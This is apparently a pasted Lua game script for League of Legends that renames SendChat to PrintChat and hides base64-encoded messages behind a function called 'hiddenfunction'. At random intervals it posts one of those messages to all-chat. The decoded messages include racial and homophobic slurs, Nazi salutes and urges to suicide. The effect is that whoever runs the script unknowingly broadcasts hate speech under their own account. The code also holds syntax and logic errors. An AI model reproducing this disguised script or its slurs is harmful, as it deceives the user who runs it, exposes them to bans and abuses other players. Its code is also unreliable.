<?php exit() ?>--by pqmailer 217.82.7.110
PrintChat = SendChat
local phrases = {
	"L0FMTCBOSUdHRVI=",
	"L0FMTCBHbyBoYW5nIHlvdXJzZWx2ZXM=",
	"L0FMTCBTaWVnIEhlaWw=",
	"L0FMTCBIZWlsIEhpdGxlcg==",
	"L0FMTCBGVUNLIE9GRg==",
	"L0FMTCBHbyBwbGF5IHRldHJpcw==",
	"L0FMTCBZb3UgZ3V5cyBzdWNrIGV2ZW4gbW9yZSB0aGFuIG91ciBlbmVteSB0ZWFt",
	"L0FMTCBMb0wgaXMgZnVsbCBvZiB0b3hpYyBwbGF5ZXJzLi4geW91IGdvZGRhbW4gZmFnZ290cw==",
	"L0FMTCBDb21lIHRvIGRyYWdvbiBmb3IgZnJlZWtpbGxz",
	"L0FMTCBGdWNrIG9mZiByZXRhcmRz",
	"L0FMTCBJIGhvcGUgeSdhbGwgZGllIGR1ZSB0byBjYW5jZXI=",
	"L0FMTCBoYWhhIGFpZHMgZmFnZ290",
	"L0FMTCB5b3UncmUgYSBmdWNraW5nIHB1c3N5IGR1ZGU=",
	"L0FMTCBwbGVhc2Ugc3RhcnQgcGxheWluZyBzb2xpdGFyZQ==",
	"L0FMTCBHTyBVTklOU1RBTEwgTk9PQlM=",
	"L0FMTCBCUk9OWkU1IFJFVEFSRFM=",
	"L0FMTCB5J2FsbCBzdWNr",
	"L0FMTCBOSUdHRVJTIEFMTCBPVkVSIFRIRSBQTEFDRQ==",
	"L0FMTCBXYW50IHNvbWUgbmlnZ2VyY29ja3MgaW4geW91ciBhbnVzPw==",
	"L0FMTCBXQVRDSCBNRSwgSSdNIFNQQU1NSU5H",
	"L0FMTCBGSVJTVEJMT09EIEJFTE9OR1MgVE8gVVMgTE9TRVJT",
	"L0FMTCBZT1UgR09OTkEgTE9TRS4uIFJFVEFSRFM="
}
hiddenfunction = Base64Decode
lastTick = GetTickCount()
nextExec = math.random(1*1000, 3*60*1000])
function OnTick()
	if lastTick - GetTickCount() >= nextExec then
		PrintChat(hiddenfunction(phrases[math.random(1, #phrases)]).."")
		nextExec = math.random(1*1000, 3*60*1000])
		lastTick = GetTickCount()
	end
end